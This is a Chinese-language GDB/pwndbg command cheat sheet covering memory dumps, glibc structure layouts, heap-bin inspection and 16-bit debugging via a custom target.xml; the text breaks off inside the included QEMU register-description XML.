<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pwndbg 中加入的 db(dump byte) dw(dump word) dq(dump qword)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">db address [count] , 命令后可以指定打印的数量, 不指定则使用默认值</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">db <span class="variable">$rsp</span></span></span><br><span class="line">00007fffffffe470     01 00 00 00 00 00 00 00 ef e6 ff ff ff 7f 00 00</span><br><span class="line">00007fffffffe480     00 00 00 00 00 00 00 00 0e e7 ff ff ff 7f 00 00</span><br><span class="line">00007fffffffe490     29 e7 ff ff ff 7f 00 00 39 e7 ff ff ff 7f 00 00</span><br><span class="line">00007fffffffe4a0     4c e7 ff ff ff 7f 00 00 58 e7 ff ff ff 7f 00 00</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">dw <span class="variable">$rsp</span></span></span><br><span class="line">00007fffffffe470     0001 0000 0000 0000 e6ef ffff 7fff 0000</span><br><span class="line">00007fffffffe480     0000 0000 0000 0000 e70e ffff 7fff 0000</span><br><span class="line">00007fffffffe490     e729 ffff 7fff 0000 e739 ffff 7fff 0000</span><br><span class="line">00007fffffffe4a0     e74c ffff 7fff 0000 e758 ffff 7fff 0000</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">dq <span class="variable">$rsp</span></span></span><br><span class="line">00007fffffffe470     0000000000000001 00007fffffffe6ef</span><br><span class="line">00007fffffffe480     0000000000000000 00007fffffffe70e</span><br><span class="line">00007fffffffe490     00007fffffffe729 00007fffffffe739</span><br><span class="line">00007fffffffe4a0     00007fffffffe74c 00007fffffffe758</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看寄存器数据</span></span><br><span class="line">(gdb) info registers</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印本地局部变量</span></span><br><span class="line">(gdb) info locals</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印全局变量名称</span></span><br><span class="line">(gdb) info variables</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看类型定义</span></span><br><span class="line">(gdb) ptype &#123;typename&#125;</span><br><span class="line"></span><br><span class="line">(gdb) ptype main_arena</span><br><span class="line">type = struct malloc_state &#123;</span><br><span class="line">    __libc_lock_t mutex;</span><br><span class="line">    int flags;</span><br><span class="line">    int have_fastchunks;</span><br><span class="line">    mfastbinptr fastbinsY[10];</span><br><span class="line">    mchunkptr top;</span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line">    mchunkptr bins[254];</span><br><span class="line">    unsigned int binmap[4];</span><br><span class="line">    struct malloc_state *next;</span><br><span class="line">    struct malloc_state *next_free;</span><br><span class="line">    size_t attached_threads;</span><br><span class="line">    size_t system_mem;</span><br><span class="line">    size_t max_system_mem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pwndbg 中加入 dt (Dump out information on a <span class="built_in">type</span> (e.g. ucontext_t).)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印指定类型的信息（可选指定address）</span></span><br><span class="line">dt typename [address] </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">dt FILE</span></span><br><span class="line">FILE</span><br><span class="line">    +0x0000 _flags               : int</span><br><span class="line">    +0x0008 _IO_read_ptr         : char *</span><br><span class="line">    +0x0010 _IO_read_end         : char *</span><br><span class="line">    +0x0018 _IO_read_base        : char *</span><br><span class="line">    +0x0020 _IO_write_base       : char *</span><br><span class="line">    +0x0028 _IO_write_ptr        : char *</span><br><span class="line">    +0x0030 _IO_write_end        : char *</span><br><span class="line">    +0x0038 _IO_buf_base         : char *</span><br><span class="line">    +0x0040 _IO_buf_end          : char *</span><br><span class="line">    +0x0048 _IO_save_base        : char *</span><br><span class="line">    +0x0050 _IO_backup_base      : char *</span><br><span class="line">    +0x0058 _IO_save_end         : char *</span><br><span class="line">    +0x0060 _markers             : struct _IO_marker *</span><br><span class="line">    +0x0068 _chain               : struct _IO_FILE *</span><br><span class="line">    +0x0070 _fileno              : int</span><br><span class="line">    +0x0074 _flags2              : int</span><br><span class="line">    +0x0078 _old_offset          : __off_t</span><br><span class="line">    +0x0080 _cur_column          : short unsigned int</span><br><span class="line">    +0x0082 _vtable_offset       : signed char</span><br><span class="line">    +0x0083 _shortbuf            : char [1]</span><br><span class="line">    +0x0088 _lock                : _IO_lock_t *</span><br><span class="line">    +0x0090 _offset              : __off64_t</span><br><span class="line">    +0x0098 _codecvt             : struct _IO_codecvt *</span><br><span class="line">    +0x00a0 _wide_data           : struct _IO_wide_data *</span><br><span class="line">    +0x00a8 _freeres_list        : struct _IO_FILE *</span><br><span class="line">    +0x00b0 _freeres_buf         : void *</span><br><span class="line">    +0x00b8 __pad5               : size_t</span><br><span class="line">    +0x00c0 _mode                : int</span><br><span class="line">    +0x00c4 _unused2             : char [20]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示malloc_state结构体信息（有各个字段的偏移</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">dt <span class="string">&quot;struct malloc_state&quot;</span></span></span><br><span class="line">struct malloc_state</span><br><span class="line">    +0x0000 mutex                : __libc_lock_t</span><br><span class="line">    +0x0004 flags                : int</span><br><span class="line">    +0x0008 have_fastchunks      : int</span><br><span class="line">    +0x0010 fastbinsY            : mfastbinptr [10]</span><br><span class="line">    +0x0060 top                  : mchunkptr</span><br><span class="line">    +0x0068 last_remainder       : mchunkptr</span><br><span class="line">    +0x0070 bins                 : mchunkptr [254]</span><br><span class="line">    +0x0860 binmap               : unsigned int [4]</span><br><span class="line">    +0x0870 next                 : struct malloc_state *</span><br><span class="line">    +0x0878 next_free            : struct malloc_state *</span><br><span class="line">    +0x0880 attached_threads     : size_t</span><br><span class="line">    +0x0888 system_mem           : size_t</span><br><span class="line">    +0x0890 max_system_mem       : size_t</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pwndbg 中加入 xinfo(Shows offsets of the specified address to useful other locations)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示指定地址到有用位置的偏移</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">xinfo [address]</span>  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">xinfo</span></span><br><span class="line">Extended information for virtual address 0x5555555548d0:</span><br><span class="line"></span><br><span class="line">  Containing mapping:</span><br><span class="line">    0x555555554000     0x55555555a000 r-xp     6000 0      /home/ubuntu/Documents/pwn/pwn</span><br><span class="line"></span><br><span class="line">  Offset information:</span><br><span class="line">         Mapped Area 0x5555555548d0 = 0x555555554000 + 0x8d0</span><br><span class="line">         File (Base) 0x5555555548d0 = 0x555555554000 + 0x8d0</span><br><span class="line">      File (Segment) 0x5555555548d0 = 0x555555554000 + 0x8d0</span><br><span class="line">         File (Disk) 0x5555555548d0 = /home/ubuntu/Documents/pwn/pwn + 0x8d0</span><br><span class="line"></span><br><span class="line"> Containing ELF sections:</span><br><span class="line">               .text 0x5555555548d0 = 0x5555555548d0 + 0x0</span><br></pre></td></tr></table></figure>

<h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vis_heap_chunks(Visualize chunks on a heap, default to the current arena<span class="string">&#x27;s active heap.)</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">可视化显示当前堆分配情况</span></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="string">vis_heap_chunks</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="string">heap</span></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="string">bins</span></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="string">fastbins</span></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="string">smallbins</span></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="string">largebins</span></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="string">tcache</span></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="string">tcachebins</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">malloc_chunk(Print a chunk.)</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">打印出指定地址的 malloc_chunk</span></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="string">malloc_chunk [addr]</span></span> </span><br></pre></td></tr></table></figure>

<h3 id="进程调试"><a href="#进程调试" class="headerlink" title="进程调试"></a>进程调试</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置当进程调用fork时是否进入子进程</span></span><br><span class="line">(gdb) set follow-fork-mode parent/child </span><br></pre></td></tr></table></figure>


<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><strong>GDB 调试 16位程序</strong></p>
<blockquote>
<p><code>set arch i8086</code> 命令并不能生效，下面的解决办法来自 <a href="https://gist.github.com/MatanShahar/1441433e19637cf1bb46b1aa38a90815">这里</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE target SYSTEM &quot;gdb-target.dtd&quot;&gt;&lt;target&gt;&lt;architecture&gt;i8086&lt;/architecture&gt;&lt;xi:include href=&quot;i386-32bit.xml&quot;/&gt;&lt;/target&gt;&#x27; &gt; target.xml</span><br><span class="line">wget https://raw.githubusercontent.com/qemu/qemu/master/gdb-xml/i386-32bit.xml</span><br><span class="line"></span><br><span class="line">(gdb) set tdesc filename ./target.xml</span><br></pre></td></tr></table></figure>

<div><div class="fold_hider"><div class="close hider_title"><code>target.xml</code></p>
</div></div><div class="fold">
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">target</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;gdb-target.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">architecture</span>&gt;</span>i8086<span class="tag">&lt;/<span class="name">architecture</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">&quot;i386-32bit.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br></pre></td></tr></table></figure>
</div></div>

<div><div class="fold_hider"><div class="close hider_title"><code>i386-32bit.xml</code></p>
</div></div><div class="fold">
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Copyright (C) 2010-2017 Free Software Foundation, Inc.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     Copying and distribution of this file, with or without modification,</span></span><br><span class="line"><span class="comment">     are permitted in any medium without royalty provided the copyright</span></span><br><span class="line"><span class="comment">     notice and this notice are preserved.  --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- I386 with SSE --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">target</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;gdb-target.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">feature</span> <span class="attr">name</span>=<span class="string">&quot;org.gnu.gdb.i386.core&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">flags</span> <span class="attr">id</span>=<span class="string">&quot;i386_eflags&quot;</span> <span class="attr">size</span>=<span class="string">&quot;4&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">start</span>=<span class="string">&quot;22&quot;</span> <span class="attr">end</span>=<span class="string">&quot;31&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;ID&quot;</span> <span class="attr">start</span>=<span class="string">&quot;21&quot;</span> <span class="attr">end</span>=<span class="string">&quot;21&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;VIP&quot;</span> <span class="attr">start</span>=<span class="string">&quot;20&quot;</span> <span class="attr">end</span>=<span class="string">&quot;20&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;VIF&quot;</span> <span class="attr">start</span>=<span class="string">&quot;19&quot;</span> <span class="attr">end</span>=<span class="string">&quot;19&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;AC&quot;</span> <span class="attr">start</span>=<span class="string">&quot;18&quot;</span> <span class="attr">end</span>=<span class="string">&quot;18&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;VM&quot;</span> <span class="attr">start</span>=<span class="string">&quot;17&quot;</span> <span class="attr">end</span>=<span class="string">&quot;17&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;RF&quot;</span> <span class="attr">start</span>=<span class="string">&quot;16&quot;</span> <span class="attr">end</span>=<span class="string">&quot;16&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">start</span>=<span class="string">&quot;15&quot;</span> <span class="attr">end</span>=<span class="string">&quot;15&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;NT&quot;</span> <span class="attr">start</span>=<span class="string">&quot;14&quot;</span> <span class="attr">end</span>=<span class="string">&quot;14&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;IOPL&quot;</span> <span class="attr">start</span>=<span class="string">&quot;12&quot;</span> <span class="attr">end</span>=<span class="string">&quot;13&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;OF&quot;</span> <span class="attr">start</span>=<span class="string">&quot;11&quot;</span> <span class="attr">end</span>=<span class="string">&quot;11&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;DF&quot;</span> <span class="attr">start</span>=<span class="string">&quot;10&quot;</span> <span class="attr">end</span>=<span class="string">&quot;10&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;IF&quot;</span> <span class="attr">start</span>=<span class="string">&quot;9&quot;</span> <span class="attr">end</span>=<span class="string">&quot;9&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;TF&quot;</span> <span class="attr">start</span>=<span class="string">&quot;8&quot;</span> <span class="attr">end</span>=<span class="string">&quot;8&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;SF&quot;</span> <span class="attr">start</span>=<span class="string">&quot;7&quot;</span> <span class="attr">end</span>=<span class="string">&quot;7&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;ZF&quot;</span> <span class="attr">start</span>=<span class="string">&quot;6&quot;</span> <span class="attr">end</span>=<span class="string">&quot;6&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">start</span>=<span class="string">&quot;5&quot;</span> <span class="attr">end</span>=<span class="string">&quot;5&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;AF&quot;</span> <span class="attr">start</span>=<span class="string">&quot;4&quot;</span> <span class="attr">end</span>=<span class="string">&quot;4&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">start</span>=<span class="string">&quot;3&quot;</span> <span class="attr">end</span>=<span class="string">&quot;3&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;PF&quot;</span> <span class="attr">start</span>=<span class="string">&quot;2&quot;</span> <span class="attr">end</span>=<span class="string">&quot;2&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">start</span>=<span class="string">&quot;1&quot;</span> <span class="attr">end</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;CF&quot;</span> <span class="attr">start</span>=<span class="string">&quot;0&quot;</span> <span class="attr">end</span>=<span class="string">&quot;0&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;eax&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span> <span class="attr">regnum</span>=<span class="string">&quot;0&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;ecx&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;edx&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;ebx&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;esp&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;data_ptr&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;ebp&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;data_ptr&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;esi&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;edi&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;eip&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;code_ptr&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;eflags&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;i386_eflags&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;cs&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;ss&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;ds&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;es&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;fs&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;gs&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- Segment descriptor caches and TLS base MSRs --&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--reg name=&quot;cs_base&quot; bitsize=&quot;32&quot; type=&quot;int32&quot;/&gt;</span></span><br><span class="line"><span class="comment">  &lt;reg name=&quot;ss_base&quot; bitsize=&quot;32&quot; type=&quot;int32&quot;/&gt;</span></span><br><span class="line"><span class="comment">  &lt;reg name=&quot;ds_base&quot; bitsize=&quot;32&quot; type=&quot;int32&quot;/&gt;</span></span><br><span class="line"><span class="comment">  &lt;reg name=&quot;es_base&quot; bitsize=&quot;32&quot; type=&quot;int32&quot;/--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;fs_base&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;gs_base&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;k_gs_base&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">flags</span> <span class="attr">id</span>=<span class="string">&quot;i386_cr0&quot;</span> <span class="attr">size</span>=<span class="string">&quot;4&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;PG&quot;</span> <span class="attr">start</span>=<span class="string">&quot;31&quot;</span> <span class="attr">end</span>=<span class="string">&quot;31&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;CD&quot;</span> <span class="attr">start</span>=<span class="string">&quot;30&quot;</span> <span class="attr">end</span>=<span class="string">&quot;30&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;NW&quot;</span> <span class="attr">start</span>=<span class="string">&quot;29&quot;</span> <span class="attr">end</span>=<span class="string">&quot;29&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;AM&quot;</span> <span class="attr">start</span>=<span class="string">&quot;18&quot;</span> <span class="attr">end</span>=<span class="string">&quot;18&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;WP&quot;</span> <span class="attr">start</span>=<span class="string">&quot;16&quot;</span> <span class="attr">end</span>=<span class="string">&quot;16&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;NE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;5&quot;</span> <span class="attr">end</span>=<span class="string">&quot;5&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;ET&quot;</span> <span class="attr">start</span>=<span class="string">&quot;4&quot;</span> <span class="attr">end</span>=<span class="string">&quot;4&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;TS&quot;</span> <span class="attr">start</span>=<span class="string">&quot;3&quot;</span> <span class="attr">end</span>=<span class="string">&quot;3&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;EM&quot;</span> <span class="attr">start</span>=<span class="string">&quot;2&quot;</span> <span class="attr">end</span>=<span class="string">&quot;2&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;MP&quot;</span> <span class="attr">start</span>=<span class="string">&quot;1&quot;</span> <span class="attr">end</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;PE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;0&quot;</span> <span class="attr">end</span>=<span class="string">&quot;0&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">flags</span> <span class="attr">id</span>=<span class="string">&quot;i386_cr3&quot;</span> <span class="attr">size</span>=<span class="string">&quot;4&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;PDBR&quot;</span> <span class="attr">start</span>=<span class="string">&quot;12&quot;</span> <span class="attr">end</span>=<span class="string">&quot;31&quot;</span>/&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--field name=&quot;&quot; start=&quot;3&quot; end=&quot;11&quot;/&gt;</span></span><br><span class="line"><span class="comment">	&lt;field name=&quot;WT&quot; start=&quot;2&quot; end=&quot;2&quot;/&gt;</span></span><br><span class="line"><span class="comment">	&lt;field name=&quot;CD&quot; start=&quot;1&quot; end=&quot;1&quot;/&gt;</span></span><br><span class="line"><span class="comment">	&lt;field name=&quot;&quot; start=&quot;0&quot; end=&quot;0&quot;/--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;PCID&quot;</span> <span class="attr">start</span>=<span class="string">&quot;0&quot;</span> <span class="attr">end</span>=<span class="string">&quot;11&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">flags</span> <span class="attr">id</span>=<span class="string">&quot;i386_cr4&quot;</span> <span class="attr">size</span>=<span class="string">&quot;4&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;VME&quot;</span> <span class="attr">start</span>=<span class="string">&quot;0&quot;</span> <span class="attr">end</span>=<span class="string">&quot;0&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;PVI&quot;</span> <span class="attr">start</span>=<span class="string">&quot;1&quot;</span> <span class="attr">end</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">	<span 